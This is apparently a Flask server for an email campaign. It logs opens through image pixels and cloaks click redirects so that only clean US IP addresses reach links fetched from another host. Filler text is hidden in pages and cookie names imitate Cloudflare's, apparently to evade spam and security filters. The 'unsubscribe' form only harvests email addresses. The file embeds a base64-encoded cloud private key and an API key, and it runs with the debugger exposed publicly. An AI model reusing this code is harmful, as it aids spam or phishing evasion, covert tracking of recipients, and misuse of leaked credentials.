import base64
import json
import requests

from flask import Flask, send_file, jsonify, redirect, make_response, request, render_template_string
import os
import random
import string
from faker import Faker
from flask import request
from google.oauth2 import service_account
from googleapiclient.discovery import build
from io import BytesIO
from google.cloud import storage
import time  # Import for Unix timestamp

app = Flask(__name__)
faker = Faker()


def checkifproxy(ip):
    url = f"https://api.ipdata.co/{ip}?api-key=22ff508dd86f3d186acdec95d8aa03393794d61e36d894ac31e09928"

    payload = {}
    headers = {}

    response = requests.request("GET", url, headers=headers, data=payload)

    if response.status_code == 200:
        # Parse the JSON response
        data = response.json()

        # Check if the country_code is "US"
        if data.get("country_code") == "US":
            # Check if all threat-related values are False
            all_safe = all(value is False for key, value in data["threat"].items() if isinstance(value, bool))

            if all_safe:
                return True
                # Add your custom action here
            else:
                return False
        else:
            return False
    else:
        return False


# Replace with your actual service account JSON credentials (encoded in Base64)
service_account_info_base64 = "eyJ0eXBlIjogInNlcnZpY2VfYWNjb3VudCIsICJwcm9qZWN0X2lkIjogInF1aWNrc3RhcnQtMTU3NjkzNjA1MTg2OSIsICJwcml2YXRlX2tleV9pZCI6ICI4YWYwYWJlYmQyMWRhNDZjM2E3OTE5MzRmYTU1YTljMmIwZDYzMWRjIiwgInByaXZhdGVfa2V5IjogIi0tLS0tQkVHSU4gUFJJVkFURSBLRVktLS0tLVxuTUlJRXZnSUJBREFOQmdrcWhraUc5dzBCQVFFRkFBU0NCS2d3Z2dTa0FnRUFBb0lCQVFDU0txSHN3Wklmb1I2cFxuZUtXNFV6SG5VdTBIeURLY25ETEN3VTJndnJhZlhORXoxS0taam9NdlgxVHE4ZGZ0bE9JT2w0MEFyUFdiM3BFQlxuNmttZVhKUVY1SHdBTkRMT3ZsVmVqV3lGVlN6VGZFL1JMR2VCelJLTVU0aTl5dk5Eb3kwcWx6SFhQOHVXQm84eVxuZXJ0YlllVjJLd2hBZUJsLzRUd3BSamNMa2x6VUdJNWl5ZFJENW1jek9xRnRBT3BHSzNoemlyMGRRL1Q3OG9ISVxuUG5LOVExMlEzSzhhbjJPelZMdG04NVlNL25pL2pMZk0zZDlhRnptTzd3QVE2SVlFNmU4OGRUdlVFTitYQ09ud1xuMlllaVczaHRJWEdJaTlmcStzYjIzN0JScUFlRW1zTE1CdUpwL3o4Y2VTOXBmcFNpbU9laVhnaXhmbkxMMEtLd1xuTFVrQkFnUVpBZ01CQUFFQ2dnRUFESmwyc0VzbVRxb3JrN1cxNlV2b21SVmRuOFphMElPcFgzN2NzMjdGSExzYVxuUUhMRG1tTjl2T3RsalVRUUZpZDNqZ1R6ejF0Wlo1aDVuUFhtWnl0NVMyTFE2bzZWVTV0MkRlcTRjRXpkaXBSa1xuWi9aQkxOL3h5WjFZdysxMjV6MXRZd2E1OGVGS3FoSENMYnFGSkhVdG03Qk5hNHMrdlhaN29sNHVXQVhEa1RlMFxuVXZsZjMySHV3NGs1K2pGSHpCSDhFc1hONkJIMWw5Z3F6QVZNWEF4eWVMTzB1VkxCbHZtVEVjME9yTEp3MVhBVFxuelFUT0loWXczYmRSbExuNThhQWFEVU05bjhCN1F0ZVYvOHR0dlovVnl0MHNQYUNwK0hxOUE0RkQyK2p6aTI2NVxuOU5Va085Q1p1OVN0T0t0NUVJNG9IZmI0cUZLZjE0VnltZW5IQ0l5STFRS0JnUURCNFZ6SnVKcWlTc1pOYnY5eVxuL0Zhblh0ZWZhN1ZFQU54WU9ldTJUWTNvTkJkY3VuTTNCOFVuYlFSKytzcklEdEhjVUgyMjRLU1ZUNkdkWTdBc1xuUVI0WjZJeWMrcVJxdytZL2ZUaTRYNXVTSi9kRk54MHlQRysxV3gvcGlOZmVwZ1diNGd3MWdZRlo0TE8rSXZDa1xuVHVCRlNGaEFSV29qK2VNa01pOVlUSjVtOVFLQmdRREEvNlRhdnp5VTdtL0FKenM3a2FxcXBEVjRUdUNKRnRTbVxuNmRocFlTanU4dmtlL0gxNWttUlBrUVd4Uk9IaDduRlNYZ3NTSm1SYm9neGE3OXExa2ViSnhGNTk3WUZORG8waFxuaS8vK1plWmRjUXNVN3RGeFFaNExpVkRON05CUi82OVF5SGE1YXRQUDJQbkV1MFNIS01OZ3BrN0NKTnBVaTc0L1xuTkNUa1BVWUtGUUtCZ1FDLzVyVFU1V2dKWTBITXV5VVZSemJ1Q3k0Wm1aNmRaTXkwZHdBY1BiOU1LdU5FNFRmUlxuTEZ1MG5tOW8wQXVPNFR4UGVVdzFpenpjblNrMmc4bUl4QnRyUVlhTWlubmJRM1BQTzc2OG44VjRjUjZLMy9hQ1xuRnRmckJmc2NTRnFEQW9saXRlZW52anV1SG45S240TFkzMG1VeWZxd0F3VC8vd01ZZktQb0hrNWJVUUtCZ1FDNFxuMzZuUkNNTkZmcWw1alpzRjB1R0RHRTFIODNiT214b1UwWWhHV1pYV1h0VVlRNUVHTlo3MVFOd05GUWl6WGE4YlxuMFk0VlVzVnJxV3pnWjBaQUM0VGgzY01PS2Naa1EvNFpGbnlmK29pVEZjZ2h3eXJKckt0eUxaVkR6UWM0cFE0UVxuK2hZUVF5Nm11UmQ0eGxJOGptV3BYV1d3UDVFTXo5ZnJ2MDFmZlBwc2lRS0JnR04vMStXVE5YNHRSL0xxMkJ4RFxuVG9qOWs2UU9HeFNuSUthd2dPbWkrWkhNY1pSaEpjWjYxaVVKLzVKSnFvb1NDSm02aHNpZmdtWVBBREpjWmFCTFxuMTVtam0yamUzaWZpN2o2K2dGS3h5VHpzL2N3ZmMvQXFRS3ZrdVFFUG92SmMwb2prclBOTEF2MEdXWkVhN2NRRFxuZXBhWE5DeEZrMURETE43Z3Q4WnVoZnRVXG4tLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tXG4iLCAiY2xpZW50X2VtYWlsIjogImdldC1zdG9yYWdlQHF1aWNrc3RhcnQtMTU3NjkzNjA1MTg2OS5pYW0uZ3NlcnZpY2VhY2NvdW50LmNvbSIsICJjbGllbnRfaWQiOiAiMTA2MDI1MDU3MDg0NDY0MDQyMzk2IiwgImF1dGhfdXJpIjogImh0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9vL29hdXRoMi9hdXRoIiwgInRva2VuX3VyaSI6ICJodHRwczovL29hdXRoMi5nb29nbGVhcGlzLmNvbS90b2tlbiIsICJhdXRoX3Byb3ZpZGVyX3g1MDlfY2VydF91cmwiOiAiaHR0cHM6Ly93d3cuZ29vZ2xlYXBpcy5jb20vb2F1dGgyL3YxL2NlcnRzIiwgImNsaWVudF94NTA5X2NlcnRfdXJsIjogImh0dHBzOi8vd3d3Lmdvb2dsZWFwaXMuY29tL3JvYm90L3YxL21ldGFkYXRhL3g1MDkvZ2V0LXN0b3JhZ2UlNDBxdWlja3N0YXJ0LTE1NzY5MzYwNTE4NjkuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCAidW5pdmVyc2VfZG9tYWluIjogImdvb2dsZWFwaXMuY29tIn0="

service_account_info = json.loads(base64.b64decode(service_account_info_base64).decode('utf-8'))

# Authenticate with Google Cloud Storage
credentials = service_account.Credentials.from_service_account_info(service_account_info)
client = storage.Client(credentials=credentials)

# Replace with your actual Google Cloud Storage bucket name
bucket_name = "allopen"
bucket = client.bucket(bucket_name)


def save_to_gcs(data, file_name):
    try:
        # Attempt to upload the data to Google Cloud Storage
        blob = bucket.blob(file_name)
        blob.upload_from_string(data)
        print(f"Data successfully saved to {file_name} in bucket {bucket_name}")
    except Exception as e:
        # Catch and print any exceptions
        print(f"Failed to save data to {file_name} in bucket {bucket_name}. Error: {str(e)}")


@app.route('/api/<path:random_characters>', methods=['GET'])
def show_image_nometadata(random_characters):
    try:
        number = random_characters.split('-')[-1]
        number = int(number)  # Ensure it's a valid number
        if number:
            user_agent = request.headers.get('User-Agent')
            ip_address = get_real_ip()
            url = request.url
            device_type = detect_device(user_agent)

            # Create the data to be saved
            tracking_data_open = {
                "url": url,
                "ip_address": ip_address,
                "user_agent": user_agent,
                "device_type": device_type,
                "randomwords": random_characters,
                "offer": number
            }

            # Convert data to JSON string
            tracking_data_json_open = json.dumps(tracking_data_open)
            # Get the current Unix timestamp
            unix_time = int(time.time())
            # Save the tracking data to Google Cloud Storage
            file_name = f"tracking_data_open/{number}_{unix_time}.json"
            save_to_gcs(tracking_data_json_open, file_name)
            # Path to the image file
            file_path = f'static/{number}.png'

            # Check if the file exists
            if not os.path.exists(file_path):
                return jsonify({'error': 'Image not found'}), 404

            # Generate random metadata
            random_title = faker.sentence()
            random_description = faker.paragraph()
            random_keywords = ", ".join(faker.words(5))  # 5 random keywords

            # Read the image file
            with open(file_path, 'rb') as img_file:
                img_data = img_file.read()

            # Generate random cookies
            random_cookie1 = faker.word()
            random_cookie2 = ''.join(random.choices(string.ascii_letters + string.digits, k=10))

            # Create the response
            response = make_response(img_data)
            response.headers['Content-Type'] = 'image/png'
            response.headers['X-Image-Title'] = random_title
            response.headers['X-Image-Description'] = random_description
            response.headers['X-Image-Keywords'] = random_keywords

            # Set cookies with random values
            response.set_cookie('__cf_bm_' + ''.join(random.choices(string.ascii_letters, k=3)), random_cookie1,
                                max_age=60 * 60)
            response.set_cookie('_umsid_' + ''.join(random.choices(string.ascii_letters, k=4)), random_cookie2,
                                max_age=60 * 60)

            return response
    except ValueError:
        return "nothing"

    else:
        user_agent = request.headers.get('User-Agent')
        ip_address = get_real_ip()
        url = request.url
        device_type = detect_device(user_agent)

        # Create the data to be saved
        tracking_data_open = {
            "url": url,
            "ip_address": ip_address,
            "user_agent": user_agent,
            "device_type": device_type,
            "randomwords": random_characters
        }

        # Convert data to JSON string
        tracking_data_json_open = json.dumps(tracking_data_open)
        # Get the current Unix timestamp
        unix_time = int(time.time())
        # Save the tracking data to Google Cloud Storage
        file_name = f"tracking_data_open/{random_characters}_{unix_time}.json"
        save_to_gcs(tracking_data_json_open, file_name)
        # Path to the image file
        file_path = f'static/1497.png'

        # Check if the file exists
        if not os.path.exists(file_path):
            return jsonify({'error': 'Image not found'}), 404

        # Generate random metadata
        random_title = faker.sentence()
        random_description = faker.paragraph()
        random_keywords = ", ".join(faker.words(5))  # 5 random keywords

        # Read the image file
        with open(file_path, 'rb') as img_file:
            img_data = img_file.read()

        # Generate random cookies
        random_cookie1 = faker.word()
        random_cookie2 = ''.join(random.choices(string.ascii_letters + string.digits, k=10))

        # Create the response
        response = make_response(img_data)
        response.headers['Content-Type'] = 'image/png'
        response.headers['X-Image-Title'] = random_title
        response.headers['X-Image-Description'] = random_description
        response.headers['X-Image-Keywords'] = random_keywords

        # Set cookies with random values
        response.set_cookie('__cf_bm_' + ''.join(random.choices(string.ascii_letters, k=3)), random_cookie1,
                            max_age=60 * 60)
        response.set_cookie('_umsid_' + ''.join(random.choices(string.ascii_letters, k=4)), random_cookie2,
                            max_age=60 * 60)

        return response


# Click
@app.route('/apiv2/<random_characters>/<subid>', methods=['GET'])
def redirect_url(random_characters, subid):
    # Define the target URL
    number = random_characters.split('-')[-1]
    sub = subid.split('-')[-1]
    number = int(number)  # Ensure it's a valid number
    sub = int(sub)  # Ensure it's a valid number
    cip = checkifproxy(get_real_ip())
    if number and subid:
        if cip:
            url = f"https://medennahas.pythonanywhere.com/api/{number}/{sub}"

            payload = {}
            headers = {}

            response = requests.request("GET", url, headers=headers, data=payload)

            # Parse the JSON response
            json_data = response.json()

            # Access the "link" field in the JSON
            link = json_data["link"]

            target_url = link

            # Generate a large block of Lorem Ipsum text
            lorem_ipsum = faker.paragraphs(30)
            lorem_ipsum_small = faker.name_male()
            user_agent = request.headers.get('User-Agent')
            ip_address = get_real_ip()
            url = request.url
            device_type = detect_device(user_agent)

            # Create the data to be saved
            tracking_data_click = {
                "url": url,
                "ip_address": ip_address,
                "user_agent": user_agent,
                "device_type": device_type,
                "randomwords": random_characters,
                "offer": number,
                "subid": sub
            }

            # Convert data to JSON string
            tracking_data_json_click = json.dumps(tracking_data_click)
            # Get the current Unix timestamp
            unix_time = int(time.time())
            # Save the tracking data to Google Cloud Storage
            file_name = f"tracking_data_click/{random_characters}_{unix_time}.json"
            save_to_gcs(tracking_data_json_click, file_name)

            # HTML content with hidden Lorem Ipsum in the body, and also in the title
            html_content = f"""
                        <html>
                        <head>
                            <meta http-equiv="refresh" content="0;url={target_url}">
                            <title>{lorem_ipsum_small} - {random_characters}</title>
                            <style>
                                .hidden-text {{
                                    visibility: hidden;
                                    height: 0;
                                    width: 0;
                                    overflow: hidden;
                                }}
                            </style>
                        </head>
                        <body>
                            <div class="hidden-text">{''.join(lorem_ipsum)}</div>
                        </body>
                        </html>
                        """

            response = make_response(html_content)
            response.headers['Content-Type'] = 'text/html'

            return response
        else:
            return f"Hello, world!"
    else:
        if cip:
            url = f"https://medennahas.pythonanywhere.com/api"

            payload = {}
            headers = {}

            response = requests.request("GET", url, headers=headers, data=payload)

            # Parse the JSON response
            json_data = response.json()

            # Access the "link" field in the JSON
            link = json_data["link"]

            target_url = link

            # Generate a large block of Lorem Ipsum text
            lorem_ipsum = faker.paragraphs(30)
            lorem_ipsum_small = faker.name_male()
            user_agent = request.headers.get('User-Agent')
            ip_address = get_real_ip()
            url = request.url
            device_type = detect_device(user_agent)

            # Create the data to be saved
            tracking_data_click = {
                "url": url,
                "ip_address": ip_address,
                "user_agent": user_agent,
                "device_type": device_type,
                "randomwords": random_characters
            }

            # Convert data to JSON string
            tracking_data_json_click = json.dumps(tracking_data_click)
            # Get the current Unix timestamp
            unix_time = int(time.time())
            # Save the tracking data to Google Cloud Storage
            file_name = f"tracking_data_click/{random_characters}_{unix_time}.json"
            save_to_gcs(tracking_data_json_click, file_name)

            # HTML content with hidden Lorem Ipsum in the body, and also in the title
            html_content = f"""
                        <html>
                        <head>
                            <meta http-equiv="refresh" content="0;url={target_url}">
                            <title>{lorem_ipsum_small} - {random_characters}</title>
                            <style>
                                .hidden-text {{
                                    visibility: hidden;
                                    height: 0;
                                    width: 0;
                                    overflow: hidden;
                                }}
                            </style>
                        </head>
                        <body>
                            <div class="hidden-text">{''.join(lorem_ipsum)}</div>
                        </body>
                        </html>
                        """

            response = make_response(html_content)
            response.headers['Content-Type'] = 'text/html'

            return response
        else:
            return f"Hello, world!"


# unsubscribe
@app.route('/apiv3/<randomwords>/unsubscribe', methods=['GET', 'POST'])
def unsubscribe(randomwords):
    if request.method == 'POST':
        email = request.form.get('email')
        if email:
            user_agent = request.headers.get('User-Agent')
            ip_address = get_real_ip()
            url = request.url
            device_type = detect_device(user_agent)

            # Create the data to be saved
            tracking_data = {
                "email": email,
                "url": url,
                "ip_address": ip_address,
                "user_agent": user_agent,
                "device_type": device_type,
                "randomwords": randomwords
            }

            # Convert data to JSON string
            tracking_data_json_unsub = json.dumps(tracking_data)
            # Get the current Unix timestamp
            unix_time = int(time.time())
            # Save the tracking data to Google Cloud Storage
            file_name = f"tracking_data_unsub/{randomwords}_{unix_time}.json"
            save_to_gcs(tracking_data_json_unsub, file_name)

            return {"message": "Success."}, 200
        else:
            return {"message": "No email provided."}, 400

    unsubscribe_form = '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Unsubscribe</title>
            <style>
                body {
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background-color: #f4f4f9;
                    margin: 0;
                    font-family: Arial, sans-serif;
                }
                .unsubscribe-container {
                    text-align: center;
                    background-color: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                }
                h1 {
                    margin-bottom: 20px;
                    font-size: 24px;
                }
                label {
                    font-size: 18px;
                    margin-bottom: 10px;
                    display: block;
                }
                input[type="email"] {
                    width: 100%;
                    padding: 10px;
                    font-size: 16px;
                    margin-bottom: 20px;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                }
                input[type="submit"] {
                    background-color: #007BFF;
                    color: white;
                    padding: 10px 20px;
                    font-size: 18px;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                }
                input[type="submit"]:hover {
                    background-color: #0056b3;
                }
            </style>
        </head>
        <body>
            <div class="unsubscribe-container">
                <h1>Unsubscribe</h1>
                <form action="/apiv3/{{ randomwords }}/unsubscribe" method="post">
                    <label for="email">Enter your email to unsubscribe:</label><br><br>
                    <input type="email" id="email" name="email" required><br><br>
                    <input type="submit" value="Unsubscribe">
                </form>
            </div>
        </body>
        </html>
        '''

    return render_template_string(unsubscribe_form, randomwords=randomwords)


# open
@app.route('/apiv3/<randomwords>', methods=['GET'])
def track_user(randomwords):
    # Get the request details
    user_agent = request.headers.get('User-Agent')
    ip_address = get_real_ip()
    url = request.url
    device_type = detect_device(user_agent)

    # Log the details to the Google Spreadsheet
    # Create the data to be saved
    tracking_data_open = {
        "url": url,
        "ip_address": ip_address,
        "user_agent": user_agent,
        "device_type": device_type,
        "randomwords": randomwords
    }

    # Convert data to JSON string
    tracking_data_json_open = json.dumps(tracking_data_open)
    # Get the current Unix timestamp
    unix_time = int(time.time())
    # Save the tracking data to Google Cloud Storage
    file_name = f"tracking_data_open/{randomwords}_{unix_time}.json"
    save_to_gcs(tracking_data_json_open, file_name)

    return {"message": "Success."}, 200


@app.route('/hello/<name>')
def hello_name(name):
    return f"Hello, {name}!"


def detect_device(user_agent):
    # Simple check to identify if the device is a phone or laptop based on user agent string
    if any(device in user_agent.lower() for device in ['iphone', 'android', 'blackberry', 'windows phone']):
        return "Phone"
    else:
        return "Laptop"


def get_real_ip():
    # Get the real IP address from the headers or remote address
    if 'X-Forwarded-For' in request.headers:
        ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
    elif 'X-Real-IP' in request.headers:
        ip = request.headers['X-Real-IP']
    else:
        ip = request.remote_addr
    return ip


@app.errorhandler(404)
def page_not_found(e):
    url = f"https://medennahas.pythonanywhere.com/smart"

    payload = {}
    headers = {}

    response = requests.request("GET", url, headers=headers, data=payload)

    # Parse the JSON response
    json_data = response.json()

    # Access the "link" field in the JSON
    link = json_data["link"]
    # Your custom logic here
    lorem_ipsum = faker.paragraphs(30)
    lorem_ipsum_small = faker.name_male()
    target_url = link
    # HTML content with hidden Lorem Ipsum in the body, and also in the title
    html_content = f"""
           <html>
           <head>
               <meta http-equiv="refresh" content="0;url={target_url}">
               <title>{lorem_ipsum_small} </title>
               <style>
                   .hidden-text {{
                       visibility: hidden;
                       height: 0;
                       width: 0;
                       overflow: hidden;
                   }}
               </style>
           </head>
           <body>
               <div class="hidden-text">{''.join(lorem_ipsum)}</div>
           </body>
           </html>
           """

    response = make_response(html_content)
    response.headers['Content-Type'] = 'text/html'

    return response


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, debug=True)
